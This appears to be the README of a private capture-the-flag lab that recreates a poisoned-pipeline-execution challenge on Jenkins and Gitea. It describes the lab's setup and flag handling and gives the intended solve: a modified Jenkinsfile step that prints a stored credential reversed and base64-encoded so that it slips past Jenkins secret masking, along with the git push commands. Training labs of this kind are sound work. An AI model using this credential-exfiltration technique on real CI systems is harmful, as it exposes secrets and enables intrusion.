# White Rabbit: poisoned pipeline execution (CyberCTF lab)

A bespoke, self-contained reproduction of the **White Rabbit** challenge from
[CI/CD Goat](https://github.com/cider-security-research/cicd-goat) — OWASP **CICD-SEC-4, Poisoned
Pipeline Execution**. Wonderland runs CI on a **Jenkins** controller that builds the
`Wonderland/white-rabbit` repository (hosted on a **Gitea** server) on every branch and pull
request. Wonderland's release token is stored as a Jenkins string credential, `flag1`, at **Global**
scope — so any pipeline on the controller can read it. An attacker with write access to the repo
modifies the `Jenkinsfile` to bind `flag1` and print it base64-encoded, pushes a branch and opens a
pull request; the pipeline runs and the flag lands in the build console. This is **Direct-PPE**.

**Private lab content — do not copy into any public repository.**

## Infrastructure

Two machines, the minimum a live-pipeline attack needs:

| Machine | What |
|---|---|
| `jenkins` | Jenkins controller, configured by Configuration-as-Code. A Job DSL seed creates the `wonderland-white-rabbit` multibranch pipeline (git-backed, branch discovery, rescanned every minute). `flag1` is a **Global-scope** string credential; builds run on the controller's own executor. `git` + `curl` are present for the in-machine solver. |
| `gitea` | Gitea git host. The setup job provisions the `Wonderland` org, the private `white-rabbit` repo, the attacker `alice` (write) and the poller `jenkins` (read), then pushes the sample project and its `Jenkinsfile`. |

No GitLab, CTFd, prod box or SSH agents — only what this one vulnerability needs. The web ports
listen on container `8080` (Jenkins) and `3000` (Gitea); the host ports are assigned dynamically by
the runner (see below). Jenkins is slow to boot — allow a few minutes.

## Objective

One per-player objective (`.ctf/objectives.json`), graded by CyberBackend:

| Key | Evidence | What the player recovers |
|---|---|---|
| `white-rabbit` | `SECRET` (`%s`) | Wonderland's `flag1` release token, exfiltrated from the Jenkins credential store via a poisoned pipeline |

Intended path: clone `Wonderland/white-rabbit` with write creds → add a `withCredentials([string(credentialsId: 'flag1', variable: 'flag1')]) { sh 'echo $flag1 | rev | base64' }` step to the `Jenkinsfile` on a new branch → push and open a pull request → the pipeline runs and prints the exfiltrated blob → reverse the base64-decoded value. The recovered token is the flag. (Modern Jenkins masks the raw value *and* its plain base64; reversing first evades the masker — see UPSTREAM.md.)

## Per-player flag

The flag is issued per player by CyberCTF and handed to the lab by the launcher as a **file**
(`isoloom.yml` `inputs: [CTF_FLAG_WHITE_RABBIT]`, delivered via
`files: [{ path: /run/lab/secrets/flag1, input: CTF_FLAG_WHITE_RABBIT }]` on the Jenkins machine),
never an environment variable, so it never appears in `docker inspect`, an image layer or a
generated file. The Jenkins entrypoint stages the file into the directory JCasC reads file secrets
from, so `flag1` (`secret: "${flag1}"`) resolves at boot **into the credential store only** — a
pipeline must bind the credential to read it, exactly as in the challenge.

An **offline start** (local, CI) leaves the input empty, and the lab stages its development
placeholder (`.ctf/objectives.json` `dev`) instead, so it still comes up and is solvable without a
launcher.

## Dynamic ports

Both web services declare `ports: { web: { port: <n>, protocol: http, publish: true } }`.
`publish: true` asks the runner for a **free host port it picks at `up` time** — there is no fixed
host port anywhere in the spec, message, configs or checks (the only literals are in-container
loopback and the lab network CIDR). The `message` reads the real URLs back through
`{{ machines.jenkins.ports.web.url }}` and `{{ machines.gitea.ports.web.url }}`.

## Run it

Described once in [`isoloom.yml`](isoloom.yml) ([Isoloom](https://www.isoloom.com)); run on Docker
through the [Isothrum](https://www.isothrum.com) runner:

```bash
isoloom validate .
isoloom generate . --target docker
isothrum up . --target docker          # add --secret-from-env CTF_FLAG_WHITE_RABBIT for a real value
isothrum check . --target docker       # Jenkins is slow; the solver waits for the build
isothrum down . --target docker
```

Solve it the way the check does:

```bash
git clone http://alice:alice@<gitea-url>/Wonderland/white-rabbit.git
cd white-rabbit && git checkout -b challenge1
# edit Jenkinsfile: withCredentials([string(credentialsId:'flag1',variable:'flag1')]){ sh 'echo $flag1 | rev | base64' }
git commit -am poison && git push origin challenge1
# open a PR in Gitea, then read the build console in Jenkins: `base64 -d <blob> | rev` is the flag
```

## Layout

- `build/jenkins/Dockerfile` — Jenkins LTS + plugins, runs as root to read the mounted secret
- `build/jenkins/casc/jenkins.yaml` — Configuration-as-Code: the Global-scope `flag1` credential, security, the Job DSL seed
- `build/jenkins/casc/jobdsl/white-rabbit.groovy` — the multibranch pipeline (git branch discovery + 1-minute rescan)
- `build/jenkins/entrypoint.sh` — stages the per-player flag into the JCasC file-secret directory
- `build/jenkins/solve.sh` — the solver / self-check (`/usr/local/bin/wr-solve`): performs Direct-PPE end to end and proves the flag was exfiltrated, never printing it
- `build/gitea/Dockerfile`, `app.ini`, `entrypoint.sh` — the installed Gitea host
- `build/gitea/seed.sh` — the `setup` step: provisions the org/users/repo and pushes the sample project
- `build/gitea/repo-src/` — the original `whiterabbit` package and its `Jenkinsfile`
- `.ctf/` — `metadata.json` and `objectives.json` (the catalogue registration)
- `UPSTREAM.md` — attribution, and the one faithful deviation (the trigger)
- `.isoloom/` — generated by `isoloom generate` (git-ignored; don't edit)
